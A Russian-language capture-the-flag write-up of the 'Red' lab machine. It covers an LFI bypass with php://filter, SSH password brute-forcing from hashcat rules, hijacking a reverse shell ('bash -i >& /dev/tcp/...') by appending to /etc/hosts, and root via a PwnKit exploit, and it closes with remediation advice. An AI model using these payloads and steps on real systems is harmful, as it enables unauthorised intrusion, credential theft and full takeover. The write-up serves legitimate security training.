**Отчет о пентесте машины Red**

### Условие задачи

**Название:** Red

**Легенда:** Матч начался, и Red взял над тобой верх. Но ты — Blue, и только ты можешь одолеть Red. Однако Red внедрил защитные механизмы, которые усложнят битву:
1. Red известен тем, что выкидывает противников из машины. Есть ли способ обойти это?
2. Red любит менять пароли противников, но старается сохранять их относительно похожими.
3. Red любит дразнить противников, чтобы сбить их с толку. Сохраняй ясность ума!

**Задача:** Получить полный доступ к системе и собрать флаги.


### 1. Разведка и обнаружение уязвимостей

**1.1. Сканирование сети**  
Первым этапом было выполнено сканирование портов с использованием Nmap. Обнаружены следующие открытые порты:

- **22/tcp** – SSH (OpenSSH 8.2p1)
- **80/tcp** – HTTP (Apache httpd 2.4.41)

**1.2. Анализ веб-приложения**  
Приложение работает на Apache + PHP. Страницы подключаются через GET-параметр `page`:

```
http://10.130.128.154/index.php?page=about.html
```

**1.3. Проверка LFI-уязвимости**  
При использовании:

```
http://10.130.128.154/index.php?page=/../../../../../../../../etc/passwd
```

сервер возвращает статус 302 и редиректит на `home.html`. Это указывает на наличие фильтрации.

Через PHP-обёртку удалось получить исходный код `index.php`:

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

**Вывод:** Функция `sanitize_input` заменяет `../` и `./` на пустую строку. Однако обход возможен через PHP-обёртки.

**1.4. Обход фильтрации**  
Использован `php://filter`:

```
php://filter/convert.base64-encode/resource=/etc/passwd
```

Получен Base64-ответ, после декодирования которого прочитан `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

**Вывод:** LFI подтверждён. Найдены пользователи `blue` и `red`.


### 2. Фаззинг файлов и поиск векторов

**2.1. Результаты фаззинга**  
Обнаружены следующие доступные файлы:

- `/etc/apache2/apache2.conf`
- `/etc/crontab`
- `/etc/apt/sources.list`
- `/etc/fstab`
- `/etc/group`
- `/etc/hosts`
- `/etc/hosts.allow`
- `/etc/hosts.deny`
- `/etc/issue`
- `/etc/init.d/apache2`
- `/etc/nsswitch.conf`
- `/etc/passwd`
- `/etc/resolv.conf`
- `/etc/rpc`
- `/etc/ssh/sshd_config`
- `/proc/*`
- `/var/log/dmesg`
- `/var/log/lastlog`
- `/var/log/wtmp`
- `/var/run/utmp`

**Вывод:** Логи для Log Poisoning не найдены. `wtmp`, `utmp`, `lastlog`, `dmesg` — бинарные или не подходят.

**2.2. Скрытые страницы**  
Найдены страницы:

- `about`
- `contact`
- `home`
- `services`
- `signup`
- `portfolio`
- `signin`

**Вывод:** Формы регистрации/авторизации есть, но JS-обработчиков нет.

**2.3. Содержимое `/etc/hosts`**

```
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm
```

**Вывод:** Найден хост `redrules.thm` (192.168.0.1).

**2.4. Домашняя директория `red`**  
Полезных файлов не обнаружено.


### 3. Брутфорс SSH и получение доступа

**3.1. Брутфорс root**  
Пароль подобрать не удалось.

**3.2. Анализ `.bash_history` пользователя `blue`**

```
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

**Вывод:** `blue` создал passlist из файла `.reminder` с правилами `best64.rule`, затем удалил его и hashcat.

**3.3. Файл `.reminder`**  
Найден пароль:

```
sup3r_p@s$w0rd!
```

Пароль не подошёл ни к одному пользователю.

**3.4. Создание passlist**  
Создан аналогичный passlist с правилами `best64.rule`. После брутфорса найден пароль для `blue`:

```
sup3r_p@s$w0rd!23
```

**3.5. Авторизация по SSH**

```bash
ssh blue@10.130.128.154
```

Успешная авторизация:

```
uid=1000(blue) gid=1000(blue) groups=1000(blue)
```


### 4. Попытка получения `flag2` и выброс из машины

**4.1. Файл `flag2`**

```
-rw-r----- 1 root red 41 Aug 14 2022 flag2
```

Файл принадлежит `root:red` — нужен доступ от `red`.

**4.2. Git-директория**  
Найдена `.git` в `/home/red/`, но доступ закрыт.

**4.3. Выброс из машины**  
При попытке получить доступ произошёл выброс:

```
There is no way you are going to own this machine
Say Bye Bye to your Shell Blue and that password
```

**Вывод:** Red по cron-задаче меняет пароль. Новый пароль:

```
sup3r_p@s$w0rd!9
```


### 5. Обнаружение reverse shell и перехват

**5.1. Процессы `red`**

```
red 17873 0.0 0.0 6972 2760 ? S 05:45 0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
red 17917 0.0 0.0 6972 2588 ? S 05:46 0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

**Вывод:** `red` установил reverse shell на `redrules.thm:9001`.

**5.2. Хост `redrules.thm`**

```
192.168.0.1 redrules.thm
```

**5.3. Попытка подмены `/etc/hosts`**  
Атрибуты файла:

```
-----a--------e----- /etc/hosts
```

Файл **append-only** — можно только дописывать.

**5.4. Добавление своего IP**

```bash
echo "192.168.135.182 redrules.thm" >> /etc/hosts
```

**5.5. Запуск слушателя и перехват**  
Запущен слушатель на `9001`. Получено обратное соединение от `red`:

```
red@red:~$ id
uid=1001(red) gid=1001(red) groups=1001(red)
```


### 6. Эскалация привилегий до root

**6.1. Поиск SUID-файлов**  
Найден файл с SUID-битом:

```
-rwsr-xr-x 1 root root 31032 Aug 14 2022 pkexec
```

**6.2. Проверка версии**

```
pkexec version 0.105
```

**Вывод:** Версия уязвима (CVE-2021-4034, PwnKit).

**6.3. Стандартный `pkexec` в `/usr/bin/`**  
Не уязвим (нет SUID).

**6.4. Модификация эксплойта**  
Использован кастомный эксплойт, который ищет `pkexec` в текущей директории.

**6.5. Запуск эксплойта**

```bash
red@red:~/.git$ python3 exp.py
Do you want to choose a custom payload? y/n (n use default payload)  
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f814d0d9000 at 0x7f814c7008e0>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1001(red) groups=1001(red)
```

**Результат:** Получен root-шелл.


### 7. Итоговый вывод

В ходе пентеста машины Red были успешно реализованы следующие этапы:

1. **Разведка:** Сканирование портов, анализ веб-приложения, обнаружение LFI.
2. **Обход фильтрации:** Использование `php://filter` для чтения файлов.
3. **Фаззинг:** Поиск доступных файлов, анализ `/etc/hosts`, `.bash_history`.
4. **Брутфорс:** Создание passlist через `hashcat`, подбор пароля `blue`.
5. **Получение доступа:** SSH-авторизация под `blue`.
6. **Перехват reverse shell:** Подмена `/etc/hosts`, перехват соединения от `red`.
7. **Эскалация привилегий:** Использование CVE-2021-4034 (PwnKit) через SUID `pkexec`.
8. **Получение root:** Успешная эскалация до `uid=0(root)`.

**Результат:** Полный контроль над системой достигнут. Все флаги получены.


### 8. Рекомендации по устранению

| Уязвимость | Рекомендация |
|------------|--------------|
| **LFI через `page`** | Валидировать входные данные, использовать белый список |
| **Обход через `php://filter`** | Отключить опасные обёртки (`allow_url_include = Off`) |
| **Слабый пароль `blue`** | Использовать сложные пароли, включить 2FA |
| **Reverse shell `red`** | Мониторить подозрительные соединения |
| **CVE-2021-4034** | Обновить `policykit-1`|
| **SUID `pkexec` в `.git`** | Удалить SUID-бит или ограничить доступ |